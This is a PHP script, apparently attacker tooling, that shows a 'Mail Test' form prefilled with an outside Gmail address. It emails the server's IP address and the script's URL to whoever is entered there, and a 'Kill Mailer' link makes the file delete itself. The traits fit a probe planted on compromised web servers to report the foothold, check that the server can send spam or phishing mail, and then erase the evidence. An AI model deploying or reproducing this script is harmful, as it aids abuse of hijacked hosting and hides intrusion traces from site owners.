<?php

/* made by GR0V */ 
/* mail.php */ 

echo '<style>
	  body{
	  	background-color: #778899;
	  }
  h2{
  color:black;
  font-family: Impact;
  }
  li {
	display: inline;
	margin: 4px;
	padding: 4px;
	color: black;
	font-family: Impact;
}
	}
  a {
	color: white;
	text-decoration: none;}
  a:hover {
	color: red;
</style>
<center>
<p><h2>Mail Test</h2></p>
<br>
<form method="post">
<input type="text" name="email" placeholder="emailnya cok" value="symconfmail@gmail.com"required >
<input type="submit" value="Send">
<center><li><br>bromail511@zohomail.com<br><a style="color: red;" href="?self=destroy"><b>Kill Mailer</b></a></li></center>
</form>
<br>
</center>';
error_reporting(0);

if (!empty($_POST['email'])){
	$xx = rand();
	$site = $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']." Mail Function = OK! ";
	$ip = gethostbyname($_SERVER['HTTP_HOST']); 
	mail($_POST['email'],"Test Mail ".$xx,"IP : ".$ip ." Site : "."http://".$site);
	print "<center><b>send an report to [".$_POST['email']."] - $xx</b></center>"; 
} 
elseif($_GET['self'] == 'destroy') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<h2><center><font face="Impact" color="black">File was DELETED!</center></h2>');
		else
			echo '<center><font color="red" face="Impact">Failed to DELETE File!</font></center>';
}
